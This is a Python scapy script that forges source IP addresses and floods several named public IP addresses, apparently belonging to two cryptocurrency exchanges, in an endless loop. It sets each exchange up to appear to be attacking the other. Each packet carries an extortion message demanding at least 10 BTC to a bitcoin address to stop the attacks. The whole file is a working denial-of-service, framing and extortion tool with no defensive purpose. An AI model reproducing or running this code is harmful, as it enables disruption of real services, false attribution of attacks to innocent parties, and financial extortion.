from scapy.all import *
from logger import *
import sys

## Work in progress.... seeing  if it's possible to spoof our own packet
tocbit_ip = ["80.87.200.60"]
tevbit_ips = ["104.18.53.164", "172.67.183.63", "104.18.52.164"]

A = "192.168.1.254" # spoofed source IP address
B = "80.87.200.60" # destination IP address
C = RandShort() # source port
D = 80 # destination port
msg = "Send all BTC you received back to the addresses you received them. This requires sending at least 10 btc to 31ren9e5HDSoCZRuH54ZUsFeYbrW5ddXmS to stop these attacks. This program will stop only when the balance on that account is greater than 5btc..." # packet payload
payload = Raw(load=msg)


def deliver(log_bool, cnt, dest, source):
	## log if desired
	if log_bool:
		log.info("Attack {num}: DST: {dst}; SRC: {src}".format(num=cnt, dst=dest, src=source))

	## deliver the packet
	TCP_init_packet = IP(src=source, dst=dest) / TCP(sport=C, dport=D) / "TCP SYN"
	send(TCP_init_packet)
	TCP_ack_packet = IP(src=source, dst=dest) / TCP(sport=C, dport=D) / "SYN-ACK"
	send(TCP_ack_packet)
	spoofed_packet = IP(src=source, dst=dest) / TCP(sport=C, dport=D) / payload

	send(spoofed_packet)
	return True

def test_local():
	limit = 10
	for i in range(limit):
		success = deliver(log, i, "50.63.99.1", tocbit_ip[0]) ## attack tevbit from tocbit

def overload_server(log_bool):
	cnt = 1
	while True:
	    for tevbit_ip in tevbit_ips:
	    	success = deliver(log_bool, cnt, tevbit_ip, tocbit_ip[0]) ## attack tevbit from tocbit
	    	if success:
	    		cnt = cnt + 1

	    	success = deliver(log_bool, cnt, tocbit_ip[0], tevbit_ip) ## attack tocbit from tevbit
	    	if success:
	    		cnt = cnt + 1

def main():
	args = sys.argv
	## handle -l flag for logging
	if "-l" in args:
		overload_server(True)
	if "-t" in args:
		global D
		D = 8081
		test_local()
	else:
		overload_server(False)

main()
